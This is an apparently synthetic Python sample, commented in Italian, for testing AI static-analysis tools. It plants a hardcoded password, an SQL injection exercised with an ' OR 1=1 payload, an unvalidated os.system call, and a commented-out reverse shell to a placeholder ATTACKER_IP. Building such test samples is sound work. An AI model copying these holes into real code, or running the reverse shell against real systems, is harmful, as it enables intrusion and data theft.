#!/usr/bin/env python3
"""
malicious_sample.py — ESEMPIO DI CODICE MALEVOLO PER TESTING
⚠️ NON ESEGUIRE QUESTO FILE SENZA AVERE COMMENTATO LE PARTI PERICOLOSE!
Contiene:
 - Reverse shell simulata
 - SQL injection
 - Hardcoded password
 - Comando os.system senza validazione
 - Errori logici
"""

import os
import socket
import sqlite3
import subprocess
import sys

# 🔐 1. Hardcoded secret (vulnerabilità)
ADMIN_PASSWORD = "super_secret_123"  # ⚠️ Vulnerabilità: hardcoded credential

def fake_login(user_input):
    """Simula login con SQL injection possibile"""
    # 🩸 2. SQL Injection vulnerability
    conn = sqlite3.connect(":memory:")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE users (username TEXT, password TEXT)")
    cursor.execute("INSERT INTO users VALUES ('admin', ?)", (ADMIN_PASSWORD,))

    # Query vulnerabile
    query = f"SELECT * FROM users WHERE username = '{user_input}'"  # ❌ INJECTION QUI
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()
    return result is not None

def dangerous_system_call(user_cmd):
    """Esegue un comando arbitrario — PERICOLOSO!"""
    # 💣 3. Command injection / RCE vulnerability
    if user_cmd:  # Nessuna validazione!
        os.system(user_cmd)  # ❌ Esecuzione arbitraria di codice

def simulated_reverse_shell():
    """Simula una reverse shell — NON ESEGUIRE SENZA COMMENTARE!"""
    # 🌐 4. Malicious behavior: reverse shell (simulato, disattivato)
    try:
        # ⚠️ Questo è codice malevolo REALE — commentato per sicurezza
        # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s.connect(("ATTACKER_IP", 4444))  # ← IP fittizio, ma reale in malware
        # os.dup2(s.fileno(), 0)
        # os.dup2(s.fileno(), 1)
        # os.dup2(s.fileno(), 2)
        # subprocess.call(["/bin/sh", "-i"])
        pass  # ← Disattivato
    except Exception:
        pass

def logic_bomb(counter_limit):
    """Contiene un errore logico che può causare ciclo infinito"""
    # 🌀 5. Logical error: possible infinite loop
    counter = 0
    while counter != counter_limit:  # Se counter_limit è float o negativo → loop!
        counter += 1
        if counter > 1000000:  # Failsafe per testing
            break
    return counter

def uninitialized_variable():
    """Usa variabile non inizializzata — errore logico"""
    # 🐞 6. Logical error: uninitialized variable
    if False:  # Condizione mai vera
        x = 10
    print(x)  # ❌ NameError: x potrebbe non essere definita

# =====================================================
# 🔍 PUNTO DI INGRESSO PER TESTING (SICURO)
# =====================================================

if __name__ == "__main__":
    print("[TEST MODE] Questo script contiene codice malevolo DISATTIVATO per sicurezza.")
    print("Lo scopo è testare strumenti di analisi statica AI-driven.")

    # Test SQL injection
    print("\n[+] Simulazione login con SQL injection...")
    if fake_login("' OR 1=1 --"):
        print("✅ Login bypassato con SQL injection!")

    # Test command injection (sicuro perché passiamo comando innocuo)
    print("\n[+] Simulazione esecuzione comando...")
    dangerous_system_call("echo 'Comando innocuo eseguito'")

    # Test reverse shell (disattivata)
    print("\n[+] Simulazione reverse shell (disattivata per sicurezza)...")
    simulated_reverse_shell()

    # Test errori logici
    print("\n[+] Test errore logico - ciclo infinito potenziale...")
    result = logic_bomb(5)
    print(f"Contatore terminato a: {result}")

    print("\n[+] Test variabile non inizializzata (decommenta per vedere l'errore)...")
    # uninitialized_variable()  # ← Scommenta per vedere NameError

    print("\n✅ Script terminato. Nessun danno fatto.")
    print("⚠️ Per test completo, analizza questo file con il tuo tool AI.")